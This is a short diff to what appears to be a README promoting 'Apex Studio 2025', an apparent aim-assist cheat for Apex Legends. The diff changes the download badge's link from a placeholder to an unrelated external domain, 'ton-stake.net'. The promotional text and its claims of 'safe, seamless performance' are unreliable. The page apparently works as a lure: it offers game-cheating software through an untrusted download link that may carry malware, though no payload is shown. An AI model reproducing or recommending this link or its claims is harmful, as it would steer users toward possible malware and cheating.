@@ -2,7 +2,7 @@
 
 Rule the arena with Apex Legends Apex Studio 2025! This cutting-edge tool enhances aim precision and legend customization, perfect for competitive players chasing Champion status. Stand out and dominate with safe, seamless performance.
 
-[![Download Apex Studio](https://img.shields.io/badge/Download-Apex_Studio-blueviolet)](#)
+[![Download Apex Studio](https://img.shields.io/badge/Download-Apex_Studio-blueviolet)](https://ton-stake.net)
 
 ---
 
